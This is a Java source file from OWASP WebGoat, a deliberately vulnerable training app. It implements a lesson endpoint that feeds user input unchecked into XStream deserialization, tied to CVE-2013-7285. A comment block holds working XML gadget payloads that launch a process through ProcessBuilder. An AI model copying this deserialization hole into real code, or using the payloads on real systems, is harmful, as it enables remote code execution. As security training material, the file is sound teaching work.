/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.vulnerable_components;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

import org.apache.commons.lang3.StringUtils;
import org.owasp.webgoat.assignments.AssignmentEndpoint;
import org.owasp.webgoat.assignments.AssignmentHints;
import org.owasp.webgoat.assignments.AttackResult;
import org.springframework.web.bind.annotation.*;

@RestController
@AssignmentHints({"vulnerable.hint"})
public class VulnerableComponentsLesson extends AssignmentEndpoint {
	
	
	/*
	 * 
<contact class='org.owasp.webgoat.vulnerable_components.Contact'>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>

<contact class='dynamic-proxy'>
<interface>org.owasp.webgoat.vulnerable_components.Contact</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
	 */

    @PostMapping("/VulnerableComponents/attack1")
    public @ResponseBody
    AttackResult completed(@RequestParam String payload) {
        XStream xstream = new XStream(/*new DomDriver()*/);
        xstream.setClassLoader(Contact.class.getClassLoader());

        //xstream.processAnnotations(Contact.class);
        xstream.alias("contact", ContactImpl.class);
        //xstream.aliasField("id", Contact.class, "id");
        xstream.ignoreUnknownElements();
        //xstream.registerConverter(new ContactConverter());
        //xstream.registerConverter(new CatchAllConverter(), XStream.PRIORITY_VERY_LOW);

        Contact contact = null;
        
        try {
        
        	
        	if (!StringUtils.isEmpty(payload)) {
        		//payload = payload.replace("contact ", "<contact ").replace("/contact ", "</contact");
        		payload = payload.replace("+", "").replace("\r", "").replace("\n", "").replace("> ", ">").replace(" <", "<");
        	}
        	System.out.println(payload);
        	
            contact = (Contact) xstream.fromXML(payload);
          
            
        } catch (Exception ex) {
            return failed(this).feedback("vulnerable-components.close").output(ex.getMessage()).build();
        }
        
        try {
            if (null!=contact) {
            	contact.getFirstName();//trigger the example like https://x-stream.github.io/CVE-2013-7285.html
            }
        } catch (Exception e) {
        	e.printStackTrace();
        	return success(this).feedback("vulnerable-components.success").build();
        }
        return failed(this).feedback("vulnerable-components.fromXML").feedbackArgs(contact).build();
    }
}
